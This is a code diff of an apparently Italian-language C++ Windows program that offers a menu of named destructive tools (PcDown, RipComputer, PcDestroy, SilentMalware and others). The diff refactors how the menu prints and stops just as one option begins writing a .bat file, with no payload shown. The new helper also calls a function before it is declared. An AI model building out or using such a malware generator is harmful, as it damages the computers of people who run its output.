@@ -2,6 +2,7 @@
 #include <string>
 #include <fstream>
 #include <windows.h>
+
 using namespace std;
 
 
@@ -10,9 +11,18 @@ using namespace std;
  * distruggerlo.
  */
 
+void writeTextSquared(string s, unsigned short squarec, unsigned short txtc) {
+	setcolor(squarec);
+	cout << "[";
+	setcolor(txtc);
+	cout << s;
+	setcolor(squarec);
+	cout << "]" << endl;
+}
+
 void setcolor(unsigned short color){
 	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
-	SetConsoleTextAttribute(hcon,color);
+	SetConsoleTextAttribute(hcon, color);
 }
 
 
@@ -35,64 +45,14 @@ int main() {
 		getline(cin, scelta);
 		setcolor(4);
 		if (scelta == "list"){ // se l'utente esegue il comando "list", allora esegue questa parte del codice.
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "SimpleMalware";
-			setcolor(7);
-			cout << "]";
-			cout << endl;
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "PcDown";
-			setcolor(7);
-			cout << "]";
-			cout << endl;
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "RipComputer";
-			setcolor(7);
-			cout << "]";
-			cout << endl;
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "EnJavaError";
-			setcolor(7);
-			cout << "]";
-			cout << endl;
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "TookMouse";
-			setcolor(7);
-			cout << "]";
-			cout << endl;
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "BlockConnection";
-			setcolor(7);
-			cout << "]";
-			cout << endl;
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "PcDestroy";
-			setcolor(7);
-			cout << "]";
-			setcolor(4);
-			cout << endl;
-			setcolor(7);
-			cout << "[";
-			setcolor(4);
-			cout << "SilentMalware";
-			setcolor(7);
-			cout << "]";
-			setcolor(4);
-			cout << endl;
+			writeTextSquared("SimpleMalware", 7, 4);
+			writeTextSquared("PcDown", 7, 4);
+			writeTextSquared("RipComputer", 7, 4);
+			writeTextSquared("EnJavaError", 7, 4);
+			writeTextSquared("TookMouse", 7, 4);
+			writeTextSquared("BlockConnection", 7, 4);
+			writeTextSquared("PcDestroy", 7, 4);
+			writeTextSquared("SilentMalware", 7, 4);
 		}else if (scelta == "simplemalware" || scelta == "Simplemalware"){ // se invecec il comando è "simplemalware", allora esegue quanto segue
 			try {
 			ofstream simplemalware("simplemalware.bat"); // crea il file
